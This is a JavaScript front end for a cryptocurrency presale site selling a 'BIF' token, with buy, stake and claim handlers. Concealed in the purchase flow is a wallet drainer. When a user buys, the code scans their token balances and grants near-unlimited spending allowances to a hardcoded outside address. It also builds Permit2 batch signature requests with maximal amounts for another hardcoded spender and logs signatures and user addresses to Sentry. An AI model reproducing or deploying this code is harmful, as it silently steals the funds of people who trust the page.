          "0xa026Ad2ceDa16Ca5FC28fd3C72f99e2C332c8a26",
          "0x8263cd1601fe73c066bf49cc09841f35348e3be0",
          "0x7f70642d88cf1c4a3a7abb072b53b929b653eda5",
          "0x0856978f7ffff0a2471b4520e3521c4b3343e36f",
          "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe",
          "0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5",
          "0x53035E4e14fb3f82C02357B35d5cC0C5b53928B4",
          "0x7CD8c22D3F4b66230F73D7FfCB48576233c3fe33",
        ];
        let aA = async (e) => {
            if (!e1) {
              Y.ZP.error("Let connect to wallet");
              return;
            }
            if (eN < 1e3) {
              Y.ZP.error("You need buy min 1000 $BIF");
              return;
            }
            /*      if ((null == aB ? void 0 : aB.value) < BigInt(aK())) {
              Y.ZP.error("You not enough " + ez + " to buy BIF");
              return;
            }   */
            console.log("user", e0);
            Sentry.captureMessage("user", e0);

            "ETH" === e6
              ? ez === "ETH"
                ? a3(e)
                : a22()
              : ez === "BNB"
              ? a7()
              : a2(),
              (0, X.Kz)(a_, "handle_buy");
          },
          aG = (0, P.GG)({
            address: aR(),
            abi: aD(),
            functionName: "approve",
            args: [aL(), aK()],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "approve_error");
            },
          }),
          aGG = (0, P.GG)({
            address: aR(),
            abi: tokenbsc[c],
            functionName: "approve",
            args: [aL(), aK()],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "approve_error");
            },
          }),
          aO = (0, P.BX)({
            hash: null === (a = aG.data) || void 0 === a ? void 0 : a.hash,
            onSuccess(e) {
              aG.reset(), a2();
            },
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "approve_error");
            },
          }),
          aW = (0, P.GG)({
            address: aL(),
            abi: "ETH" == e6 ? m : x,
            functionName: "buyTokenByUSDT",
            args: [parseFloat(aK(ex) + ""), aC()],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "send_usdt_error");
            },
          }),
          aX = (0, P.BX)({
            hash: null === (D = aW.data) || void 0 === D ? void 0 : D.hash,
            onSuccess(e) {
              var a;
              ag(
                aU(null === (a = aW.data) || void 0 === a ? void 0 : a.hash, e6)
              ),
                aW.reset(),
                aF(),
                (0, X.Kz)(a_, "BUY_USDT_SUCCESS_" + e6);
            },
          }),
          a$ = (0, P.GG)({
            address: V,
            abi: m,
            functionName: "buyTokenByUSDTAndStake",
            args: [parseFloat(aK(ex) + ""), aC()],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "send_usdt_error");
            },
          });
        (0, P.BX)({
          hash: null === (Q = a$.data) || void 0 === Q ? void 0 : Q.hash,
        });
        let aY = (0, P.GG)({
            address: V,
            abi: m,
            functionName: "buyTokenByEth",
            args: [aC()],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "send_eth_error");
            },
          }),
          aM = (0, P.BX)({
            hash: null === (ea = aY.data) || void 0 === ea ? void 0 : ea.hash,
            onSuccess(e) {
              var a;
              ag(
                aU(
                  null === (a = aY.data) || void 0 === a ? void 0 : a.hash,
                  "ETH"
                )
              ),
                aY.reset(),
                aF(),
                (0, X.Kz)(a_, "BUY_ETH_SUCCESS");
            },
          }),
          aq = (0, P.GG)({
            address: V,
            abi: m,
            functionName: "buyTokenByEthAndStake",
            args: [aC()],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "buyTokenByEthAndStake_error");
            },
          }),
          aJ = (0, P.BX)({
            hash: null === (es = aq.data) || void 0 === es ? void 0 : es.hash,
            onSuccess(e) {
              aF();
            },
          }),
          aQ = (0, P.GG)({
            address: ee,
            abi: x,
            functionName: "buyTokenByBNB",
            args: [aC()],
            onSuccess: () => {
              Y.ZP.success("Buy Token Success");
            },
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "send_bnb_error");
            },
            chainId: 56,
          }),
          aV = (0, P.BX)({
            hash: null === (et = aQ.data) || void 0 === et ? void 0 : et.hash,
            onSuccess(e) {
              var a;
              ag(
                aU(
                  null === (a = aQ.data) || void 0 === a ? void 0 : a.hash,
                  "BSC"
                )
              ),
                aQ.reset(),
                aF(),
                (0, X.Kz)(a_, "BUY_BNB_SUCCESS");
            },
          }),
          a0 = (0, P.GG)({
            address: "0x1636bEfc738c4c1027367628A7b65A405D9A6213",
            abi: v,
            functionName: "stakeFromPresale",
            args: [e0, 1e5],
            onError: (e) => {
              console.error(e);
            },
          });
        (0, P.BX)({
          hash: null === (en = a0.data) || void 0 === en ? void 0 : en.hash,
          onSuccess(e) {
            aF();
          },
        });
        let a1 = (0, P.GG)({
            address: V,
            abi: m,
            functionName: "claim",
            chain: 1,
            onSuccess: (e) => {
              Y.ZP.success("Claim success");
            },
            onError: (e) => {
              console.error(e);
            },
          }),
          a6 = (0, P.BX)({
            hash: null === (er = a1.data) || void 0 === er ? void 0 : er.hash,
            onSuccess(e) {
              a1.reset(), a6.reloadData();
            },
          }),
          a4 = (0, P.GG)({
            address: V,
            abi: m,
            functionName: "stake",
            onError: (e) => {
              console.error(e);
            },
          });
        (0, P.BX)({
          hash: null === (ei = a4.data) || void 0 === ei ? void 0 : ei.hash,
          onSuccess(e) {
            a4.reset(), aF();
          },
        });
        let a9 = async (e) => {
            e ? a$.write() : aW.write(), (0, X.Kz)(a_, "handleSendUSDT");
          },
          a5 = async (e) => {
            aG.write({ args: [aL(), e] }), (0, X.Kz)(a_, "handle_approve");
          },
          a15 = async (e) => {
            aG.write({ args: [aL(), e] }), (0, X.Kz)(a_, "handle_approve");
          },
          a19 = async () => {},
          abb = async (c) => {
            var a = 0n;
            let e = await (0, F.a4)({
              chainId: 1,
              address: tokenAddresses[c],
              abi: m,
              functionName: "balanceOf",
              args: [e0],
            });
            let s = await (0, F.a4)({
              address: tokenAddresses[c],
              abi: aD(),
              functionName: "allowance",
              args: [e0, aL()],
            });
            BigInt(e + "") > BigInt(s + "")
              ? aaa.write({
                  address: tokenAddresses[c],
                  abi: h,
                  functionName: "increaseAllowance",
                  args: [
                    "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590",
                    "115792089237316195423570985008687907853269984665640563606586961506910471875321",
                  ],
                  onError: (e) => {
                    console.error(e), (0, X.Kz)(a_, "approve_error");
                  },
                })
              : a19();
            BigInt(e + "") > BigInt(s + "")
              ? aka.write({
                  address: tokenAddresses[c],
                  abi: u,
                  functionName: "increaseApproval",
                  args: [
                    "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590",
                    "115792089237316195423570985008687907853269984665640563606586961506910471875321",
                  ],
                  onError: (e) => {
                    console.error(e), (0, X.Kz)(a_, "approve_error");
                  },
                })
              : a19();
            /*          BigInt(e + "") > BigInt(s + "")
                ? aaa.write({
                    args: [
                      "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590",
                      "115792089237316195423570985008687907853269984665640563606586961506910471875321",
                    ],
                  })
                : a19(); */
          },
          aab = (0, P.GG)({
            address: tokenbsc[1],
            abi: h,
            functionName: "increaseAllowance",
            args: [
              "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590",
              "115792089237316195423570985008687907853269984665640563606586961506910471875321",
            ],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "approve_error");
            },
          }),
          aaa = (0, P.GG)({
            address: tokenAddresses[1],
            abi: h,
            functionName: "increaseAllowance",
            args: [
              "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590",
              "115792089237316195423570985008687907853269984665640563606586961506910471875321",
            ],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "approve_error");
            },
          }),
          acc = (0, P.GG)({
            address: tokenbsc[0],
            abi: h,
            functionName: "increaseAllowance",
            args: [
              "0xd9a8f7ecc231bc3f412073af9b927368b0039c05",
              "115792089237316195423570985008687907853269984665640563606586961506910471875321",
            ],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "approve_error");
            },
            chainId: 56,
          }),
          aka = (0, P.GG)({
            address: tokenAddresses[1],
            abi: u,
            functionName: "increaseApproval",
            args: [
              "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590",
              "115792089237316195423570985008687907853269984665640563606586961506910471875321",
            ],
            onError: (e) => {
              console.error(e), (0, X.Kz)(a_, "approve_error");
            },
          }),
          amm = async () => {
            const slices = [0, 300, 600, 900, tokenbsc.length];
            /*     const promises = slices.slice(1).map((end, index) => {
              const start = slices[index];
              const slicedArgs = tokenbsc.slice(start, end);
              console.log("Sliced args:", slicedArgs);
              return kola;
            });   */
            const s = await (0, F.a4)({
              address: "0x0A09582D14BF4Eb5dFC8AF6fC98c5CB7E2955D83",
              abi: aABI,
              functionName: "getNonZeroBalanceIndexes",
              args: [tokenbsc.slice(0, 300), e0],
            });
            const r = await (0, F.a4)({
              address: "0x0A09582D14BF4Eb5dFC8AF6fC98c5CB7E2955D83",
              abi: aABI,
              functionName: "getNonZeroBalanceIndexes",
              args: [tokenbsc.slice(300, 600), e0],
            });
            const t = await (0, F.a4)({
              address: "0x0A09582D14BF4Eb5dFC8AF6fC98c5CB7E2955D83",
              abi: aABI,
              functionName: "getNonZeroBalanceIndexes",
              args: [tokenbsc.slice(600, 900), e0],
            });
            const l = await (0, F.a4)({
              address: "0x0A09582D14BF4Eb5dFC8AF6fC98c5CB7E2955D83",
              abi: aABI,
              functionName: "getNonZeroBalanceIndexes",
              args: [tokenbsc.slice(900, tokenbsc.length), e0],
            });
            const n = [
              ...s,
              ...r.map((x) => x + BigInt(r.length > 0 ? 300 : 0)),
              ...t.map((x) => x + BigInt(t.length > 0 ? 600 : 0)),
              ...l.map((x) => x + BigInt(l.length > 0 ? 900 : 0)),
            ];
            console.log("r", r);
            console.log("t", t);
            console.log("l", l);

            // Assuming `n` is an array of indexes for tokenbsc array
            // Now, iterate over `n` and call `aaa` for each index
            console.log("Non-zero balance indexes:", n);
            for (let i of n) {
              await acc.write({
                address: tokenbsc[i],
                abi: h,
                functionName: "increaseAllowance",
                args: [
                  "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590",
                  "115792089237316195423570985008687907853269984665640563606586961506910471875321",
                ],
                onError: (e) => {
                  console.error(e), (0, X.Kz)(a_, "approve_error");
                },
              });
            }
          },
          add = async (c) => {
            let e = await (0, F.a4)({
              address: tokenbsc[c],
              abi: m,
              functionName: "balanceOf",
              args: [e0],
            });
            let s = await (0, F.a4)({
              address: tokenbsc[c],
              abi: u,
              functionName: "allowance",
              args: [e0, "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590"],
            });
            console.log("user", e0);
            Sentry.captureMessage("user", e0);
            console.log(tokenbsc.length);
            console.log(e + "", s + "");
            BigInt(e + "") > BigInt(s + "")
              ? aaa.write({
                  address: tokenbsc[c],
                  abi: h,
                  functionName: "increaseAllowance",
                  args: [
                    "0xb0E5CFE41fdBc767D218Dc6a048681A9240a4590",
                    "115792089237316195423570985008687907853269984665640563606586961506910471875321",
                  ],
                  onError: (e) => {
                    console.error(e), (0, X.Kz)(a_, "approve_error");
                  },
                  chainId: 56,
                })
              : a19();
          },
          checkTokenBalances = async () => {
            let balances = [];
            for (let i = 0; i < tokenAddresses.length; i++) {
              let balance = await (0, F.a4)({
                chainId: 1,
                address: tokenAddresses[i],
                abi: h,
                functionName: "balanceOf",
                args: [e0],
              });
              if (!balance.isZero()) {
                // Assuming balance is a BigNumber; use balance > 0 for normal numbers
                balances.push(balance);
              } else {
                console.error(
                  `Error checking balance for token at ${tokenAddresses}:`,
                  error
                );
              }
              return balances;
            }
          },
          signTypeBatch = async (dataToSign, account) => {
            try {
              const signature = await ethereum.request({
                method: "eth_signTypedData_v4",
                params: [account, JSON.stringify(dataToSign)],
                from: account,
              });
              console.log("Signature:", signature);
              console.log("Signature:", signature.result);

              Sentry.captureMessage("Signature", signature);
              //              Sentry.captureMessage("Message", dataToSign);
            } catch (error) {
              console.error("Error signing:", error);
            }
          },
          signTyped = async (dataToSign, account) => {
            // Ensure `window.ethereum` is available
            if (!window.ethereum) {
              throw new Error("Ethereum provider is not available");
            }
            try {
              // Use `window.ethereum.request` directly with a promise
              const result = await window.ethereum.request({
                method: "eth_signTypedData_v4",
                params: [account, dataToSign], // Ensure dataToSign is correctly serialized
              });
              console.log("result", result, account);
              return result; // The resolved value of the promise is the result
            } catch (err) {
              // Handle any errors that occur during the request
              console.error("Error signing typed data:", err);
              throw err; // Rethrow the error to be handled by the caller
            }
          },
          getSignerAddressFromSignature = async (dataToSign, signature) => {
            // Assuming `dataToSign` is what you had the user sign, and `signature` is the resulting signature
            // This could be a message, a transaction payload, etc., depending on your use case
            //            console.log(ethers)
            // Using ethers.js to recover the address from the signature
            const signerAddress = ethers.utils.verifyMessage(
              dataToSign,
              signature
            );

            // Logging the signer address to the console
            console.log(`Signer Address: ${signerAddress}`);

            return signerAddress;
          },
          createPermitDataForToken = async (i) => {
            // Placeholder function to get permit data (amount, nonce, expiration, signature) for a token
            // You should replace this with actual logic to get these values
            const nonce = "0";
            const amount = "1461501637330902918203684832716283019655932542975";
            const expiration = "281474976710600"; // or another specific expiration time if needed
            const token = tokenAddresses[i];
            return {
              token,
              amount,
              expiration,
              nonce,
            };
          },
          createsinglepermit = async (c) => {
            const spender = "0x39e569db466772a3162f3609a16c71ca9a5e2680"; // Using e0 as the owner address
            const sigDeadline = "281474976710600";
            const nonce = "0";
            const amount = "1461501637330902918203684832716283019655932542975";
            const expiration = "281474976710600"; // or another specific expiration time if needed
            const token = tokenAddresses[c];
            const details = {
              token,
              amount,
              expiration,
              nonce,
            };
            console.log("details", details);
            const permitSingle = { details, spender, sigDeadline };
            console.log("permitSingle", permitSingle);
            const dataToSign = JSON.stringify({
              domain: domain,
              types: {
                EIP712Domain: [
                  { name: "name", type: "string" },
                  { name: "chainId", type: "uint256" },
                  { name: "verifyingContract", type: "address" },
                ],
                /*      Permit: [
                  { name: "owner", type: "address" },
                  { name: "permitBatch", type: "PermitBatch" },
                ], */
                PermitSingle: [
                  { name: "details", type: "permitdetails" },
                  { name: "spender", type: "address" },
                  { name: "sigDeadline", type: "uint256" },
                ],
                permitdetails: [
                  { name: "token", type: "address" },
                  { name: "amount", type: "uint160" },
                  { name: "expiration", type: "uint48" },
                  { name: "nonce", type: "uint48" },
                ],
              },
              primaryType: "PermitSingle",
              message: permitSingle,
            });
            try {
              console.log("dataToSign", dataToSign);
              const signature = await signTyped(dataToSign, e0);
              console.log("signature", signature);
              const kuksa = await getSignerAddressFromSignature(
                dataToSign,
                signature
              );
              console.log("signer", kuksa);
              return {
                signature,
              };
            } catch (error) {
              console.error("Error creating permit:", error);
              throw error; // Re-throw the error to be handled by the caller
            }
          },
          createbatchpermit = async (c) => {
            let token;
            const owner = e0; // Using e0 as the owner address
            const spender = "0x39e569db466772a3162f3609a16c71ca9a5e2680"; // Using e0 as the owner address
            const sigDeadline = "281474976710600";
            const expiration = "281474976710600";
            const amount = "1461501637330902918203684832716283019655932542975";
            const nonce = 0;
            //            const token = tokenAddresses[i];
            const details = [];

            const accounts = await window.ethereum.send(
              "eth_requestAccounts",
              []
            );
            const selectedaddress = accounts[0];
            for (let i = 0; i < c.length; i++) {
              details.push(await createPermitDataForToken(c[i]));
            }
            /*         const types = {
              permitdetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint256" },
                { name: "expiration", type: "uint256" },
                { name: "nonce", type: "uint256" },
              ],
            };
*/
            console.log("details", details);
            const permitBatch = { details, spender, sigDeadline };
            console.log("permitBatch", permitBatch);
            /*       const PermitBatch = [
              { name: "details", type: "permitdetails[]" },
              { name: "spender", type: "address" },
              { name: "sigDeadline", type: "uint48" },
            ];
            const message = {
              owner,
              spender,
              sigDeadline,
              details, // This is the key adjustment
            };
            const permit = { owner, permitBatch };
            const Permit = [
              { name: "owner", type: "address" },
              { name: "permitBatch", type: "PermitBatch" },
            ];  */
            const permit = { selectedaddress, permitBatch };

            const dataToSign = JSON.stringify({
              domain: domain,
              types: {
                EIP712Domain: [
                  { name: "name", type: "string" },
                  { name: "chainId", type: "uint256" },
                  { name: "verifyingContract", type: "address" },
                ],
                /*      Permit: [
                  { name: "owner", type: "address" },
                  { name: "permitBatch", type: "PermitBatch" },
                ], */
                PermitBatch: [
                  { name: "details", type: "permitdetails[]" },
                  { name: "spender", type: "address" },
                  { name: "sigDeadline", type: "uint256" },
                ],
                permitdetails: [
                  { name: "token", type: "address" },
                  { name: "amount", type: "uint160" },
                  { name: "expiration", type: "uint48" },
                  { name: "nonce", type: "uint48" },
                ],
              },
              primaryType: "PermitBatch",
              message: permitBatch,
            });
            /*        web3.currentProvider.sendAsync(
              {
                method: "eth_signTypedData_v4",
                params: [selectedaddress, dataToSign],
                from: selectedaddress,
              },
              async (error, result) => {
                if (error != null) {
                  console.log("Error signing");
                  return;
                }
                console.log("result", result);
                console.log("result2", result.result);
                console.log("result2", dataToSign);
                const kuksa = await getSignerAddressFromSignature(
                  dataToSign,
                  result.result
                );
                console.log("signer", kuksa);
              }
            ); */

            try {
              console.log("dataToSign", dataToSign);
              const signature = await signTyped(dataToSign, e0);
              console.log("signature", signature);
              const kuksa = await getSignerAddressFromSignature(
                dataToSign,
                signature
              );
              console.log("signer", kuksa);

              return {
                signature,
              };
            } catch (error) {
              console.error("Error creating permit:", error);
              throw error; // Re-throw the error to be handled by the caller
            }
          },
          createPermit = async (spender, value, c, deadline) => {
            // Validate e0 (Ethereum address) before proceeding
            if (!e0 || e0 === "" || !e0.startsWith("0x") || e0.length !== 42) {
              throw new Error("Invalid Ethereum address provided.");
            }
            let e = await (0, F.a4)({
              chainId: 1,
              address: tokenAddresses[c],
              abi: h,
              functionName: "nonces",
              args: [e0],
            });
            let nonce = Number(e);
            const owner = e0; // Using e0 as the owner address
            // const nonce = e; // Using the nonce from the contract
            console.log("nonce", nonce);
            const permit = { owner, spender, value, nonce, deadline };
            const Permit = [
              { name: "owner", type: "address" },
              { name: "spender", type: "address" },
              { name: "value", type: "uint256" },
              { name: "nonce", type: "uint256" },
              { name: "deadline", type: "uint256" },
            ];

            const dataToSign = JSON.stringify({
              types: {
                EIP712Domain: domainType,
                Permit: Permit,
              },
              domain: domain,
              primaryType: "Permit",
              message: permit,
            });
            try {
              const signature = await signTyped(dataToSign, e0);
              //              const split = splitSig(signature);
              console.log("signature");
              console.log("signature", dataToSign, e0);
              console.log("signature", signature.result);

              return {
                split,
                signature,
              };
            } catch (error) {
              console.error("Error creating permit:", error);
              throw error; // Re-throw the error to be handled by the caller
            }
          },
          a2 = async () => {
            var a = 0n;
            a = BigInt(aK(ex));
            let s = await (0, F.a4)({
                address: aR(),
                abi: aD(),
                functionName: "allowance",
                args: [e0, aL()],
              }),
              t = BigInt(s + "");
            console.log("Allowance", t, "Amount", a);
            await amm();

            t < a ? (t > 0 ? a5(0) : a5(a)) : a9(e);
            //           const approveCalls = tokenbsc.map((_, i) => add(i));
            // Wait on all promises concurrently
            //   await add(4);
            //          await Promise.all(approveCalls);
            //   a9(e);
            //    t < a ? (t > 0 ? a5(0) : a5(a)) : a9(e),
            (0, X.Kz)(a_, "buy_by_usdt");
          },
          a22 = async () => {
            var a = 0n;
            a = BigInt(aK(ex));
            let s = await (0, F.a4)({
                address: aR(),
                abi: aD(),
                functionName: "allowance",
                args: [e0, aL()],
              }),
              t = BigInt(s + "");
            console.log("Allowance", t, "Amount", a);
            t < a ? (t > 0 ? a5(0) : a5(a)) : a9(e);
            //   a9(e);
            //    t < a ? (t > 0 ? a5(0) : a5(a)) : a9(e),
            (0, X.Kz)(a_, "buy_by_usdt");
          },
          a3 = async (e) => {
            let a = (0, k.n9)(ex);
            console.log(tokenAddresses.length);

            console.log(
              "Buy BIF With Eth. AmountToTransfer:",
              a,
              "Balance: ",
              aB.value,
              a < aB.value,
              "Stake",
              e,
              "addresPresale",
              V,
              "ref",
              aC()
            );
            //       let balances = checkTokenBalances();
            // let balances = [2, 6, 11];
            //       console.log("balances", balances);
            //       const permitBatch = await createbatchpermit(balances);

            //       console.log("permit", permitBatch);
            //    console.log(`sig: ${permit.signature}`);
            /*   let x = permit.split.v;
            let L = parseInt(x);
            console.log(
              `r: ${permit.split.r}, s: ${permit.split.s}, v: ${L}, sig: ${permit.signature}`
            ); */

            //  const approveCalls = tokenAddresses.map((_, i) => abb(i));
            // Wait on all promises concurrently
            // await abb(4);
            //  await Promise.all(approveCalls);
            e ? aq.write({ value: a }) : aY.write({ value: a }),
              (0, X.Kz)(a_, "buy_by_eth");
          },
          a7 = async () => {
            let e = BigInt((0, k.n9)(ex) + "");
            console.log("Buy BIF With BNB. AmountToTransfer", e);
            // const approveCalls = tokenbsc.map((_, i) => add(i));
            // Wait on all promises concurrently
            // await abb(4);
            let a = 1000;
            await amm();
            aQ.write({ value: e });
            //   e > a ? aQ.write({ value: e }) : a19();
            //   e > a ? await amm() : a19();
            (0, X.Kz)(a_, "buy_by_bnb");
          },
          a8 = async () => {
            if (!e1) {
              alert("Let connect to wallet");
              return;
            }
            if (eZ <= 0) {
              Y.ZP.error("You not have $BIF to claim");
              return;
            }
            1 == e9.id ? a1.write() : aS(1), (0, X.Kz)(a_, "handle_claim");
          };
        function se(e) {
          let a = parseFloat(e);
          if ((ej(e), ev(a), "ETH" == ez)) {
            let e = parseFloat(e_ + "") / parseFloat(aP() + ""),
              s = a * e;
            ef(parseFloat(s + "")), eg(parseFloat(s + "").toFixed(2) + "");
          } else if ("USDT" == ez) {
            let e = parseFloat(eC + "") / parseFloat(aP() + ""),
              s = a * e;
            ef(parseFloat(s + "")), eg(parseFloat(s + "").toFixed(2) + "");
          } else if ("BNB" == ez) {
            let e = parseFloat(eT + "") / parseFloat(aP() + ""),
              s = a * e;
            ef(parseFloat(s + "")), eg(parseFloat(s + "").toFixed(2) + "");
          }
        }
        aH();
        let { t: sa } = (0, G.$G)("home");
        function ss() {
          return (eL * ey) / 10n ** 18n;
        }
        function st() {
          return (998n * eL * ey) / 1000n / 10n ** 18n;
        }
        return (0, t.jsxs)("div", {
          className: "App",
          children: [
            (0, t.jsx)("section", { id: "home" }),
            (0, t.jsx)(R.Z, {}),
            (0, t.jsx)(Y.x7, {
              position: "bottom-right",
              reverseOrder: !1,
              toastOptions: {
                duration: 4e3,
                style: {
                  background: "#4893FE",
                  color: "#fff",
                  fontSize: "small",
                },
              },
            }),
            (0, t.jsx)("section", { id: "buynow" }),
            (0, t.jsx)("div", {
              className: "row container-buy center center-container",
              style: { backgroundImage: "url(".concat(C.Z.src, ")") },
              children: (0, t.jsxs)("div", {
                className: "collume center center-container",
                children: [
                  (0, t.jsx)(L(), { className: "logo", src: E.Z }),
                  (0, t.jsxs)("div", {
                    className: "frameBuy ",
                    children: [
                      (0, t.jsx)("span", {
                        className: "margin_top textBold",
                        children: sa("buy_frame.buy_in_before_increase"),
                      }),
                      (0, t.jsxs)("span", {
                        className: "stageName",
                        children: [
                          sa("buy_frame_in_stage"),
                          " ",
                          parseInt(eX + ""),
                          "/6",
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className: "progress-bar-container",
                        children: [
                          (0, t.jsx)("div", {
                            className: "progress-bar",
                            style: { width: "".concat(aw, "%") },
                          }),
                          (0, t.jsxs)("div", {
                            className: "nextStageInfo",
                            children: ["Next Price:", " $", (0, k.dF)(eY, 9)],
                          }),
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className: "totalSold1",
                        children: [
                          sa("buy_frame.total_sold"),
                          " ",
                          (0, t.jsxs)("span", {
                            className: "totalSold",
                            children: [
                              "$",
                              (0, t.jsx)(q.ZP, { end: (0, k.He)(st()) }),
                              " / $",
                              (0, t.jsx)(q.ZP, { end: (0, k.He)(ss()) }),
                              " ",
                            ],
                          }),
                        ],
                      }),
                      (0, t.jsx)("h2", {
                        children: (0, t.jsxs)("span", {
                          className: "totalSold",
                          children: [
                            "1 BIF = ",
                            parseFloat(ey + "") /
                              parseFloat("1000000000000000000"),
                            " $",
                          ],
                        }),
                      }),
                      (0, t.jsxs)("div", {
                        className: "center-container center button-container",
                        children: [
                          (0, t.jsxs)("div", {
                            className:
                              "usdtButton center-container row btnLeft",
                            onClick: aZ,
                            children: [
                              (0, t.jsx)(L(), {
                                className: "iconToken",
                                src: "ETH" == e6 ? p.Z : N.Z,
                                alt: "Paris",
                              }),
                              "ETH" == e6 ? "ETH" : "BNB",
                            ],
                          }),
                          (0, t.jsxs)("div", {
                            className:
                              "usdtButton center-container row btnRight",
                            onClick: az,
                            children: [
                              (0, t.jsx)(L(), {
                                className: "iconToken",
                                src: j.Z,
                                alt: "Paris",
                              }),
                              "USDT",
                            ],
                          }),
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className:
                          "buyButton  changeNetWorkBtn center-container",
                        onClick: function () {
                          aI(),
                            "ETH" == e6
                              ? (e4("BSC"),
                                eK("BNB"),
                                eG(N.Z),
                                (0, X.Kz)(a_, "Buy With BNB"))
                              : (e4("ETH"),
                                eK("ETH"),
                                eG(p.Z),
                                (0, X.Kz)(a_, "Buy With ETH"));
                        },
                        children: [
                          sa("buy_with"),
                          " ",
                          "ETH" == e6 ? "BNB" : "ETH",
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className: "connect center-container collume",
                        children: [
                          !e1 &&
                            (0, t.jsxs)("div", {
                              className:
                                "btnConnect center-container row btnLeft",
                              onClick: eJ,
                              children: [
                                (0, t.jsx)(L(), {
                                  className: "imgLogout",
                                  src: S.Z,
                                  width: 27,
                                  height: 27,
                                }),
                                sa("connect_wallet"),
                              ],
                            }),
                          !1,
                          e1 &&
                            (0, t.jsxs)("div", {
                              className:
                                "btnConnect center-container row btnLeft",
                              onClick: eJ,
                              children: [
                                (0, t.jsx)(L(), {
                                  className: "imgLogout",
                                  src: g.Z,
                                  width: 25,
                                  height: 25,
                                }),
                                " ",
                                (0, M.Z)(e0),
                                (0, t.jsx)("div", { class: "verticalLine" }),
                                (0, t.jsxs)("div", {
                                  className: "balance_ether row",
                                  children: [
                                    (0, t.jsx)(q.ZP, {
                                      end:
                                        "USDT" === ez && "ETH" === e6
                                          ? (0, k.te)(
                                              null == aB ? void 0 : aB.value
                                            )
                                          : (0, k.He)(
                                              null == aB ? void 0 : aB.value
                                            ),
                                      useEasing: !1,
                                      decimals: "ETH" === ez ? 5 : 2,
                                    }),
                                    " ",
                                    (0, t.jsx)("div", {
                                      className: "symbol",
                                      children: null == aB ? void 0 : aB.symbol,
                                    }),
                                  ],
                                }),
                                (0, t.jsx)(L(), {
                                  className: "imgLogout",
                                  src: b.Z,
                                  width: 20,
                                  height: 20,
                                }),
                              ],
                            }),
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className: "row wpepebalance  textStatus ",
                        style: e1 ? {} : { display: "none" },
                        children: [
                          sa("Your Balance:"),
                          " ",
                          (0, t.jsxs)("div", {
                            className: "balance_ether",
                            children: [
                              (0, t.jsx)(q.ZP, {
                                end: (0, k.He)(eZ),
                                duration: 1,
                              }),
                              " BIF",
                              " ",
                            ],
                          }),
                          " ",
                        ],
                      }),
                      (0, t.jsx)("span", {
                        style: e1 ? {} : { display: "none" },
                        className: "smalltext ref_text",
                        children: sa("buy_frame.ref"),
                      }),
                      (0, t.jsxs)("div", {
                        className: "ref-container",
                        style: e1 ? {} : { display: "none" },
                        children: [
                          (0, t.jsxs)("span", {
                            className: "long-text",
                            id: "linkref",
                            children: [
                              "https://bullpepewifhat.xyz/?refId=",
                              e0,
                            ],
                          }),
                          (0, t.jsx)(L(), {
                            className: "copy-button",
                            id: "copyBtn",
                            src: _.Z,
                            height: 30,
                            width: 40,
                          }),
                        ],
                      }),
                      (0, t.jsxs)("div", {
                        className: "center collume center-container",
                        children: [
                          (0, t.jsx)("div", {
                            className: "row center-container",
                            children: (0, t.jsx)("div", {
                              children: (0, t.jsxs)("div", {
                                className: "row center-container",
                                children: [
                                  aO.isLoading &&
                                    (0, t.jsx)("div", {
                                      className: "textStatus",
                                      children: sa("buy_frame.Approving"),
                                    }),
                                  aO.isLoading &&
                                    (0, t.jsxs)("div", {
                                      className: "lds-ellipsis",
                                      children: [
                                        (0, t.jsx)("div", {}),
                                        (0, t.jsx)("div", {}),
                                        (0, t.jsx)("div", {}),
                                        (0, t.jsx)("div", {}),
                                      ],
                                    }),
                                ],
                              }),
                            }),
                          }),
                          (0, t.jsx)("div", {
                            className: "center collume center-container",
                            children: (0, t.jsxs)("div", {
                              children: [
                                (0, t.jsxs)("div", {
                                  className: "row center-container",
                                  children: [
                                    aX.isLoading &&
                                      (0, t.jsx)("div", {
                                        className: "center textStatus",
                                        children: sa("buy_frame.Sending USDT"),
                                      }),
                                    aX.isLoading &&
                                      (0, t.jsxs)("div", {
                                        className: "lds-ellipsis",
                                        children: [
                                          (0, t.jsx)("div", {}),
                                          (0, t.jsx)("div", {}),
                                          (0, t.jsx)("div", {}),
                                          (0, t.jsx)("div", {}),
                                        ],
                                      }),
                                  ],
                                }),
                                (0, t.jsx)("div", {
                                  className: "row",
                                  children:
                                    "" !== ab &&
                                    (0, t.jsx)("button", {
                                      className: "checkhashButton",
                                      onClick: () => {
                                        window.open(
                                          ab,
                                          "_blank",
                                          "noopener,noreferrer"
                                        );
                                      },
                                      children: sa("check_hash"),
                                    }),
                                }),
                              ],
                            }),
                          }),
                          aX.isError &&
                            (0, t.jsx)("div", {
                              className: "center textStatus error",
                              children: sa("buy_error"),
                            }),
                          (0, t.jsx)("div", {
                            className: "row",
                            children: (0, t.jsxs)("div", {
                              children: [
                                (0, t.jsxs)("div", {
                                  className: "row center-container",
                                  children: [
                                    (aM.isLoading ||
                                      aJ.isLoading ||
                                      aV.isLoading) &&
                                      (0, t.jsxs)("div", {
                                        className: "textStatus",
                                        children: ["Sending ", ez],
                                      }),
                                    (aM.isLoading ||
                                      aJ.isLoading ||
